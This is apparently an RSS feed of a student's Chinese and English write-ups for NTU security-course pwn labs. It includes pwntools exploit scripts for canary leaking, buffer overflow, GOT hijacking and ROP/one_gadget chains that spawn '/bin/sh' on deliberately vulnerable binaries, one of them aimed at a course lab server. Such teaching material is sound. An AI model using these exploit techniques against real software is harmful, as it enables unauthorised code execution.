<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SBK Hugo Site</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/</link><description>Recent content on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/index.xml" rel="self" type="application/rss+xml"/><item><title>NTU CS 2023 HW3 Write Up</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/</guid><description>&lt;h1 id="ntu-cs-2023-hw3-write-up">
 NTU CS 2023 HW3 Write Up
 &lt;a class="anchor" href="#ntu-cs-2023-hw3-write-up">#&lt;/a>
&lt;/h1>
&lt;h2 id="lab-stackoverflow">
 Lab-Stackoverflow
 &lt;a class="anchor" href="#lab-stackoverflow">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>flag{Y0u_know_hoW2L3@k_canAry}&lt;/code>&lt;/p>
&lt;h3 id="解題流程與思路">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af">#&lt;/a>
&lt;/h3>
&lt;p>這一題就是前一年的&lt;a href="https://hackmd.io/@SBK6401/BJijt4A9s">Leak Canary&lt;/a>的應用版，當時是用pwndbg，還不知道gef的偉大，總之這一題的思路就是:&lt;/p>
&lt;ol>
&lt;li>接收開shell的function的address(win function)&lt;/li>
&lt;li>接收0x20個bytes，分別代表RSP value/Stack Canary/RBP value/RIP&lt;/li>
&lt;li>傳送payload過去，分別是&lt;code>p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr)&lt;/code>&lt;/li>
&lt;li>這樣就可以蓋到RIP後又不會被偵測到canary被改變，return之後拿到shell&lt;/li>
&lt;/ol>
&lt;p>:::info
比較值得注意的是，因為我是在公布解答前先自己寫，遇到了return之後拿不到shell的問題，後來經過助教的解釋才知道原來是，開shell的過程中&lt;code>&amp;lt;do_system+115&amp;gt; movaps XMMWORD PTR [rsp], xmm1&lt;/code>，RSP必須要是對齊的狀態，也就是最後應該要是0，但可以看下圖，如果直接跳到win function的開頭，rsp就不是0，會偏移8 bytes，所以會出現SIGSEGV
&lt;img src="https://hackmd.io/_uploads/rJK-2d0ma.png" alt="圖片" />&lt;/p>
&lt;p>解決方式有兩個，一個是少push一次，一個是多pop一次，這樣就可以校正RSP回到0結尾的狀態，所以我們才要在RIP的地方加上(0xf1-0xe9)的offset，讓RIP可以少push一次，這樣就可以解決問題
&lt;img src="https://hackmd.io/_uploads/ByhF2OCQa.png" alt="圖片" />&lt;/p>
&lt;p>&lt;img src="https://hackmd.io/_uploads/SyxvoO0Xa.png" alt="圖片" />
:::&lt;/p>
&lt;h3 id="exploit---leak-canary--control-rip">
 Exploit - Leak Canary + Control RIP
 &lt;a class="anchor" href="#exploit---leak-canary--control-rip">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from pwn import *

# r = process(&amp;#39;./lab&amp;#39;)
r = remote(&amp;#39;10.113.184.121&amp;#39;, 10041)

r.recvuntil(b&amp;#39;Gift: 0x&amp;#39;)
win_addr = int(r.recvline().strip(), 16) + (0xf1 - 0xe9)
r.recvuntil(b&amp;#39;Gift2: &amp;#39;)
rsp_val = u64(r.recv(0x8))
stack_canary = u64(r.recv(0x8))
rbp_val = u64(r.recv(0x8))
rip = u64(r.recv(0x8))

log.info(f&amp;#39;win address = {hex(win_addr)}&amp;#39;)
log.info(f&amp;#39;RSP value = {hex(rsp_val)}&amp;#39;)
log.info(f&amp;#39;Stack Canary = {hex(stack_canary)}&amp;#39;)
log.info(f&amp;#39;RBP value = {hex(rbp_val)}&amp;#39;)
log.info(f&amp;#39;RIP value = {hex(rip)}&amp;#39;)

payload = p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr)
log.info(f&amp;#39;Payload = {payload}&amp;#39;)
# raw_input()
r.sendline(payload)

r.interactive()
&lt;/code>&lt;/pre>&lt;h2 id="lab-shellcode">
 Lab-Shellcode
 &lt;a class="anchor" href="#lab-shellcode">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>flag{How_you_do0o0o0o_sysca1111111}&lt;/code>&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x00</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/</guid><description>&lt;h1 id="simple-buffer-overflow---0x00">
 Simple Buffer Overflow - 0x00
 &lt;a class="anchor" href="#simple-buffer-overflow---0x00">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn">#&lt;/a>
&lt;/h6>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main()
{
 char buf[0x10];
 read(0, buf, 0x30); // It&amp;#39;ll read the value that you input and store in buf with length=0x30
 system(&amp;#34;pause&amp;#34;);
 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Note that you can check &lt;a href="https://www.dotcpp.com/course/460">this page&lt;/a> to know more about &lt;code>read&lt;/code> function&lt;/li>
&lt;/ul>
&lt;h2 id="dynamic-analysis---x32dbg">
 Dynamic Analysis - &lt;code>x32dbg&lt;/code>
 &lt;a class="anchor" href="#dynamic-analysis---x32dbg">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>This is the original entry point of this program.
&lt;img src="https://imgur.com/DWOL9Hy.png" alt="" />&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x01</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/</guid><description>&lt;h1 id="simple-buffer-overflow---0x01">
 Simple Buffer Overflow - 0x01
 &lt;a class="anchor" href="#simple-buffer-overflow---0x01">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn">#&lt;/a>
&lt;/h6>
&lt;p>Follow the concept of lecture &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/SJAt7Pd5s">0x00&lt;/a>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

void y0u_c4n7_533_m3()
{
 execve(&amp;#34;/bin/sh&amp;#34;, (char *[]){0}, (char *[]){0});
}

int main()
{
 char buf[16];
 puts(&amp;#34;This is your first bof challenge ;)&amp;#34;);
 fflush(stdout);
 read(0, buf, 0x30);
 system(&amp;#34;pause&amp;#34;);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>The secret function is aim to create a shell, therefore, our main purpose is try to get the shell by using buffer overflow.
We can check &lt;code>bof&lt;/code> in the main function that it read the string with length &lt;code>0x30&lt;/code> that bigger than &lt;code>buf&lt;/code> size.&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x02</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/</guid><description>&lt;h1 id="simple-buffer-overflow---0x02">
 Simple Buffer Overflow - 0x02
 &lt;a class="anchor" href="#simple-buffer-overflow---0x02">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn">#&lt;/a>
&lt;/h6>
&lt;h2 id="why-wed-like-to-create-shellcode">
 Why we&amp;rsquo;d like to create shellcode?
 &lt;a class="anchor" href="#why-wed-like-to-create-shellcode">#&lt;/a>
&lt;/h2>
&lt;p>In pwn problem, most of the program don&amp;rsquo;t have the secret function that we can take the shell. Thus, we can create a shellcode by ourselves and use &lt;code>bof&lt;/code> to overlap the original address by shellcode address. Then we can take the shell.&lt;/p>
&lt;h2 id="how-to-create-a-shellcode-in-bof">
 How to create a shellcode in BOF?
 &lt;a class="anchor" href="#how-to-create-a-shellcode-in-bof">#&lt;/a>
&lt;/h2>
&lt;p>In lecture &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJm5x_Ocs">0x01&lt;/a>, we can see sub-function that create a shell using command:&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x04</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/</guid><description>&lt;h1 id="simple-buffer-overflow---0x04">
 Simple Buffer Overflow - 0x04
 &lt;a class="anchor" href="#simple-buffer-overflow---0x04">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn">#&lt;/a>
&lt;/h6>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-clike!" data-lang="clike!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

char message[48];

int main()
{
 char name[16];
 printf(&amp;#34;Give me your message: &amp;#34;);
 fflush(stdout);
 read(0, message, 0x30);
 fflush(stdout);
 read(0, name, 0x30);
 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>Actually, this is a variant of the &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJm5x_Ocs">lecture 0x01&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;font color="F0000">Note that&lt;/font>, the global variable has its own address, instead of local variable that push to stack that we don&amp;rsquo;t know at first.&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x05(Leak Canary)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/</guid><description>&lt;h1 id="simple-buffer-overflow---0x05leak-canary">
 Simple Buffer Overflow - 0x05(Leak Canary)
 &lt;a class="anchor" href="#simple-buffer-overflow---0x05leak-canary">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="canary-background">
 Canary Background
 &lt;a class="anchor" href="#canary-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://imgur.com/onxC8Aq.png" alt="" />&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-clike!" data-lang="clike!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

void backdoor()
{
 system(&amp;#34;/bin/sh&amp;#34;);
}

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 char name[0x10];
 char phone[0x10];

 printf(&amp;#34;What&amp;#39;s your name: &amp;#34;);
 read(0, name, 0x100);
 printf(&amp;#34;Hello, %s !&amp;#34;, name);

 printf(&amp;#34;What&amp;#39;s your phone number: &amp;#34;);
 read(0, phone, 0x100);

 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Note that, if you establish the code yourself, you must turn off the protection by the command below and use &lt;code>checksec&lt;/code> to observe the protection
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">gcc -o bof2_leak_canary bof2_leak_canary.c -zexecstack -no-pie -z norelro
&lt;/code>&lt;/pre>&lt;img src="https://imgur.com/u5iueTC.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>First, we can use &lt;code>objdump -d -M Intel {filename}&lt;/code> to check the address of backdoor → &lt;code>0x4011b6&lt;/code>
&lt;img src="https://imgur.com/d30qIvL.png" alt="" />&lt;/p></description></item><item><title>Simple PWN - 0x06(GOT hijacking/Lab - `got2win`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/</guid><description>&lt;h1 id="simple-pwn---0x06got-hijackinglab---got2win">
 Simple PWN - 0x06(GOT hijacking/Lab - &lt;code>got2win&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x06got-hijackinglab---got2win">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>challenge: &lt;code>nc edu-ctf.zoolab.org 10004&lt;/code>&lt;/p>
&lt;h2 id="got-background">
 GOT Background
 &lt;a class="anchor" href="#got-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/ktoVQB99Gj4?t=4423">Lecture Vid. - Pwn week1&lt;/a>
&lt;a href="https://youtu.be/PBgHHWtjtFA?t=6017">NTUSTISC - Pwn Basic 2 [2019.03.19]&lt;/a>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Original Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

char flag[0x30];

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 int fd = open(&amp;#34;/home/chal/flag&amp;#34;, O_RDONLY);
 read(fd, flag, 0x30);
 close(fd);
 write(1, &amp;#34;Good luck !\n&amp;#34;, 13);

 unsigned long addr = 0;
 printf(&amp;#34;Overwrite addr: &amp;#34;);
 scanf(&amp;#34;%lu&amp;#34;, &amp;amp;addr);
 printf(&amp;#34;Overwrite 8 bytes value: &amp;#34;);
 read(0, (void *) addr, 0x8);

 printf(&amp;#34;Give me fake flag: &amp;#34;);
 int nr = read(1, flag, 0x30);
 if (nr &amp;lt;= 0)
 exit(1);
 flag[nr - 1] = &amp;#39;\0&amp;#39;;
 printf(&amp;#34;This is your flag: ctf{%s}... Just kidding :)\n&amp;#34;, flag);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN - 0x07(ROP)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x07rop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x07rop/</guid><description>&lt;h1 id="simple-pwn---0x07rop">
 Simple PWN - 0x07(ROP)
 &lt;a class="anchor" href="#simple-pwn---0x07rop">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>This is very similar to normal &lt;code>BOF&lt;/code>.&lt;/li>
&lt;li>If a sample code that doesn&amp;rsquo;t have a backdoor function and you cannot input a backdoor function as well, then you can use some code segment to merge a shellcode.&lt;/li>
&lt;li>Therefore, the main idea is use some &lt;code>&amp;lt;operation&amp;gt;;ret&lt;/code> pattern segment to overlap stack.
&lt;img src="https://imgur.com/YGarADK.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-c!=1" data-lang="c!=1">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main()
{
 setvbuf(stdin, 0, _IONBF, 0)
 setvbuf(stdout, 0, _IONBF, 0);

 char s[0x10];

 printf(&amp;#34;Here is your \&amp;#34;/bin/sh\&amp;#34;: %p\n&amp;#34;, &amp;#34;/bin/sh&amp;#34;);
 printf(&amp;#34;Give me your ROP: &amp;#34;);
 read(0, s, 0x400);
 
 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>At line &lt;code>11&lt;/code>, &lt;code>%p&lt;/code> means pointer of &lt;code>/bin/sh&lt;/code> string.&lt;/li>
&lt;li>Note that, if you establish the code yourself, you must turn off the protection by the command below and use &lt;code>checksec&lt;/code> to observe the protection. In addition, please use &lt;code>-static&lt;/code> command to compile library at compile time, so that we can get &lt;code>ROP gadget&lt;/code> more easily.
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">gcc -o rop rop.c -zexecstack -no-pie -fno-stack-protector -z norelro -static
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>First, we can observe the program has overflow(very important), but has no other backdoor method can access or global variable can write shellcode. Then we can consider to use &lt;code>ROP gadget&lt;/code> to construct chain.&lt;/li>
&lt;li>Second, we use &lt;code>ROPgadget&lt;/code> to find suitable gadget
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ ROPgadget --multibr --binary rop &amp;gt; rop_gadget
$ vim rop_gadget
&lt;/code>&lt;/pre>&lt;img src="https://imgur.com/IzeTvgK.png" alt="" />
&lt;img src="https://imgur.com/PlA5C8B.png" alt="" />
&lt;img src="https://imgur.com/zg28Pti.png" alt="" />
&lt;img src="https://imgur.com/WDS0HUh.png" alt="" />
&lt;img src="https://imgur.com/dEh7b5n.png" alt="reference link" />
&lt;ul>
&lt;li>Note that, you may consider that &lt;code>pop rdx ; pop rbx ; ret&lt;/code> is not what we want. We just want &lt;code>pop rdx ; ret&lt;/code>. Therefore, we have to push one more value for &lt;code>pop rbx ;&lt;/code> instruction.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Then, we can construct our payload:
&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">from pwn import *

context.arch = &amp;#39;amd64&amp;#39;

r = process(&amp;#39;./rop&amp;#39;)

r.recvuntil(&amp;#39;Here is your &amp;#34;/bin/sh&amp;#34;: &amp;#39;)
binsh = int(r.recvline()[:-1], 16)
info(f&amp;#34;binsh: {hex(binsh)}&amp;#34;)

pop_rdi_ret = 0x401eaf
pop_rsi_ret = 0x409ede
pop_rdx_ret = 0x485aeb
pop_rax_ret = 0x44fcc7
syscall = 0x401c64
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Note that, &lt;code>r.recvline()[:-1]&lt;/code> is &lt;code>b'0x498004'&lt;/code> and we must pop to &lt;code>%rdi&lt;/code> at line &lt;code>17&lt;/code> below.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Then we can combine them together using &lt;a href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.flat">flat method&lt;/a>. It&amp;rsquo;ll flat the address with &lt;strong>length 8 bytes&lt;/strong>.
&lt;pre tabindex="0">&lt;code class="language-python!=16" data-lang="python!=16">ROP = flat(
 pop_rdi_ret, binsh,
 pop_rsi_ret, 0,
 pop_rdx_ret, 0, 0,
 pop_rax_ret, 0x3b,
 syscall,
)

gdb.attach(r)
r.sendafter(&amp;#34;Give me your ROP: &amp;#34;, b&amp;#39;a&amp;#39; * 0x18 + ROP)

r.interactive()
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Finally, we got shell!!!
&lt;img src="https://imgur.com/dk0Z2mw.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>This is totally the same as our hypothesis.
&lt;img src="https://imgur.com/OjcDNbu.png" alt="" />&lt;/li>
&lt;li>We can see that all parameters are ready
&lt;img src="https://imgur.com/xXx7HRQ.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/iA4Hrr17ooI?t=1239">NTUSTISC - Pwn Basic 3 [2019.03.26]&lt;/a>
&lt;a href="https://youtu.be/ktoVQB99Gj4?t=6712">Pwn week1&lt;/a>&lt;/p></description></item><item><title>Simple PWN - 0x08(one_gadget with ROP)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/</guid><description>&lt;h1 id="simple-pwn---0x08one_gadget-with-rop">
 Simple PWN - 0x08(one_gadget with ROP)
 &lt;a class="anchor" href="#simple-pwn---0x08one_gadget-with-rop">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="one_gadget-background">
 one_gadget background
 &lt;a class="anchor" href="#one_gadget-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10226977">Day25: [Misc] 我從來沒想過我會害怕寫 code&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>原理是在 &lt;code>glibc&lt;/code> 裡面有很多會透過 &lt;code>execve&lt;/code> 執行 &lt;code>/bin/sh&lt;/code>、再調用外部系統指令的 assembly，當 explolit 已經得知 &lt;code>libc&lt;/code> 的位之後而且可以控制 RIP 之後，就可以直接跳該位置達成 shell out，不需要再辛苦堆 stack 上的參數&lt;/p>&lt;/blockquote>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IOBNF, 0);

 char s[0x10];

 printf(&amp;#34;Your libc: %p&amp;#34;, printf);
 read(0, s, 0x100);

 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>The program has buffer overflow, however it has no backdoor method can access and has no global variable can write shellcode. Thus, we can consider to use &lt;code>ROP&lt;/code> to get shell.&lt;/li>
&lt;li>Note that, it must be a dynamic library, so DO NOT use &lt;code>-static&lt;/code> to compile it.
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">gcc -o one_gadget_with_rop one_gadget_with_rop.c -no-pie -fno-stack-protector -z norelro -zexecstack
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>First, we use &lt;a href="https://shengyu7697.github.io/linux-ldd/">&lt;font color="FF0000">&lt;code>ldd&lt;/code>&lt;/font>&lt;/a> command to find what library the program will use.
&lt;img src="https://imgur.com/ycRb8Tv.png" alt="" />&lt;/li>
&lt;li>In addition, we use &lt;code>one_gadget&lt;/code> command to find &lt;code>execvs&lt;/code>
&lt;ul>
&lt;li>Note that, how to use it can refer to &lt;a href="https://blog.csdn.net/weixin_43092232/article/details/105085880">one_gadget用法&lt;/a>&lt;/li>
&lt;li>We use &lt;code>0xebcf8 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)&lt;/code> as our method
&lt;img src="https://imgur.com/Y7BBH5J.png" alt="" />
&lt;ul>
&lt;li>&lt;font color="FF0000">Note:&lt;/font> it has 3 constraint so that we can get the shell&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">address rbp-0x78 is writable
[rsi] == NULL || rsi == NULL
[rdx] == NULL || rdx == NULL
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Then, we use &lt;code>one_gadget&lt;/code> command to get &lt;code>ROP&lt;/code> chain
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">ROPgadget --binary one_gadget_with_rop --only &amp;#34;pop|ret&amp;#34; &amp;gt; one_gadget
vim one_gadget
&lt;/code>&lt;/pre>You can see that because we didn&amp;rsquo;t compile with library, the gadget that we may can use is very few.
&lt;img src="https://imgur.com/DuGINHL.png" alt="" />
The solution is using the gadget that &lt;code>libc&lt;/code> have:
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &amp;#34;pop|ret&amp;#34; &amp;gt; one_gadget
$ vim one_gadget
&lt;/code>&lt;/pre>We must satisfied one_gadget constraint. &lt;code>0x90529&lt;/code> and &lt;code>0x2be51&lt;/code> are the offset of &lt;code>/lib/x86_64-linux-gnu/libc.so.6&lt;/code>. Therefore, if we want to call these gadget, &lt;font color="FF0000">we must find out the real base address of &lt;code>/lib/x86_64-linux-gnu/libc.so.6&lt;/code>&lt;/font>.
&lt;img src="https://imgur.com/3h5PqcO.png" alt="" />
&lt;img src="https://imgur.com/Z2bBbhJ.png" alt="" />&lt;/li>
&lt;li>Because, &lt;code>ASLR&lt;/code> is turn on in default, so the address of library will be random, we just know the offset of library. In original code, it told us the &lt;code>printf&lt;/code> address in &lt;code>/lib/x86_64-linux-gnu/libc.so.6&lt;/code> → &lt;font color="FF0000">&lt;code>0x7ffff7def770&lt;/code>&lt;/font>
&lt;img src="https://imgur.com/nuYGx24.png" alt="" />
Used &lt;code>gdb&lt;/code> can find the current address of library → &lt;font color="FF0000">&lt;code>0x7ffff7d8f000&lt;/code>&lt;/font>
&lt;img src="https://imgur.com/Et3r2hI.png" alt="" />
Then we can know the offset and construct apart of payload as below
$$0x7ffff7def770 - 0x7ffff7d8f000 = 0x60770$$
&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">from pwn import *
import sys

context.arch = &amp;#39;amd64&amp;#39;

r = process(&amp;#39;./one_gadget_with_rop&amp;#39;)

r.recvuntil(&amp;#34;Your libc: &amp;#34;)
libc = int(r.recv(14), 16) - 0x60770
info(f&amp;#34;libc: {hex(libc)}&amp;#34;)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>And prepare our gadget:
&lt;pre tabindex="0">&lt;code class="language-python!=11" data-lang="python!=11">pop_rdx_rbx_ret = libc + 0x90529
pop_rsi_ret = libc + 0x2be51
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Construct whole payload with considering the constraint:
&lt;pre tabindex="0">&lt;code class="language-python!=13" data-lang="python!=13">r.send(b&amp;#39;a&amp;#39;*0x10 + p64(0x404000) + p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) + p64(libc+0xebcf8))
r.interactivae()
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>b'a'*0x10&lt;/code> is for &lt;code>$rsi&lt;/code>&lt;/li>
&lt;li>&lt;code>p64(0x404000)&lt;/code> is an arbitrary writable and readable address for &lt;code>$rbp-0x78&lt;/code> one of the constraint of one_gadget&lt;/li>
